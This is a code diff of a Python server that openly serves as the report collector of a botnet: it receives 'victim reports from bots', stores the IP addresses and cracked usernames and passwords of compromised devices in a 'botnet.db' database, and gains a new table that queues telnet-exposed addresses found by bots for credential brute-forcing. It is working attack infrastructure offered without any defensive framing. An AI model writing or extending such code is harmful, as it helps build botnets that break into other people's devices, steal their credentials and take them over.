@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
 Passive report server — receives victim reports from bots and logs them.
-Shared DB with controller.py (botnet.db).
 Listens on TCP, stores to SQLite.
 """
 
@@ -33,7 +32,7 @@ def get_con():
 
 def db_init():
     con = get_con()
-    con.execute("""
+    con.executescript("""
         CREATE TABLE IF NOT EXISTS devices (
             device_id   TEXT PRIMARY KEY,
             ip          TEXT,
@@ -46,17 +45,20 @@ def db_init():
             uptime      REAL,
             first_seen  TEXT,
             last_seen   TEXT
-        )
+        );
+
+        CREATE TABLE IF NOT EXISTS devices_tobrute (
+            device_id   INTEGER PRIMARY KEY AUTOINCREMENT,
+            ip          TEXT UNIQUE,
+            scanned_by_ip TEXT
+        );
     """)
+    # scanned_by_ip is useful to keep if we want to tell the device who found it to also brute it
     con.commit()
     con.close()
 
 
 def db_insert(device_id, ip, username, password):
-    """
-    Insert a new device. If it already exists (re-report), update
-    credentials and last_seen but leave controller-enriched fields alone.
-    """
     con = get_con()
     now = datetime.datetime.now(datetime.UTC)
     con.execute("""
@@ -71,6 +73,15 @@ def db_insert(device_id, ip, username, password):
     con.commit()
     con.close()
 
+def db_insert_tobrute(ip, scanned_by_ip):
+    con = get_con()
+    con.execute("""
+        INSERT INTO devices_tobrute (ip, scanned_by_ip)
+        VALUES (?, ?)
+        ON CONFLICT(ip) DO NOTHING
+    """, [ip, scanned_by_ip])
+    con.commit()
+    con.close()
 
 def db_dump():
     con = get_con()
@@ -102,23 +113,29 @@ def handle_client(conn, addr):
             data += chunk
 
         # Expected format per line:
-        #   IP:user:pass
+        #   IP:user:pass -> bruted device
+        #   s:IP         -> scanned ip has telnet port open
         for line in data.decode(errors="ignore").splitlines():
             line = line.strip()
+            print(line)
             if not line:
                 continue
 
             parts = line.split(":")
-            if len(parts) == 3:
+            if len(parts) == 2:
+                s, ip = parts
+                db_insert_tobrute(ip, addr[0]);
+                print(f"  [DEVICE] {ip} scanned by {addr[0]} added")
+            elif len(parts) == 3:
                 ip, user, pwd = parts
+                device_id = generate_device_id(ip, user, pwd)
+
+                db_insert(device_id, ip, user, pwd)
+                print(f"  [DEVICE] {device_id}  {ip} {user}:{pwd}")
             else:
                 print(f"  [!] Unrecognised format: {line}")
                 continue
 
-            device_id = generate_device_id(ip, user, pwd)
-
-            db_insert(device_id, ip, user, pwd)
-            print(f"  [DEVICE] {device_id}  {ip} {user}:{pwd}")
 
     except Exception as e:
         print(f"  [!] Error handling {addr}: {e}")
